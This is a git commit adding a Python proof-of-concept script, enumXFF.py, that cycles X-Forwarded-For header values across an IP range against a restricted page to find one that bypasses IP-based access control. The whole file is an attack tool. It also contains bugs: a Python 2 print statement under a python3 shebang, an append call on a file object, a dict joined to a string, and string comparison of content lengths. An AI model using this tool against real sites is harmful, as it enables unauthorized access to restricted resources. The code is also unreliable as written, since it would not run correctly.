7421d0aa2af5f822096f8a99dd9152764d7d271b
shubs <shahshubham369@gmail.com>
2015-07-16 18:30:02 +1000

    Added preliminary PoC

---
+++ enumXFF.py
@@ -0,0 +1,46 @@
+#!/usr/bin/env python3
+from concurrent.futures import ThreadPoolExecutor
+from requests_futures.sessions import FuturesSession
+import argparse
+import iptools
+from tqdm import tqdm
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-t", "--target",
+                    help="Restricted Page (target)")
+parser.add_argument("-cl", "--badcl",
+                    help="Restricted Access Content Length")
+parser.add_argument("-r", "--range",
+					help="IP range i.e. 0.0.0.0-255.255.255.255")
+parser.add_argument("-w", "--workers",
+					help="Worker/thread count - default is 20", default=20)
+parser.add_argument("-o", "--output",
+					help="If an IP address returns a higher content length, save IP address to file", 
+						default="working_ips.txt")
+args = parser.parse_args()
+
+session = FuturesSession(executor=ThreadPoolExecutor(max_workers=args.workers))
+
+def generate_ips(ip_range):
+	ip_start = ip_range.split("-")[0]
+	ip_end = ip_range.split("-")[1]
+	r = iptools.IpRange(ip_start, ip_end)
+	return r
+
+ip_addresses = generate_ips(args.range)
+
+for ip in tqdm(ip_addresses):
+	ip_list = ("{0}, ".format(ip) * 50)[:-2]
+	x_forwarded_for_header = {"X-Forwarded-For" : ip_list}
+	future = session.head(args.target, headers=x_forwarded_for_header)
+	response = future.result()
+	if response.headers['content-length'] > args.badcl:
+		ip_save_file = open(args.output, "a")
+		ip_save_file.append(args.target + ": " + x_forwarded_for_header + "\n")
+		print "Access granted with {0}".format(ip)
+		break
+
+
+
+
+
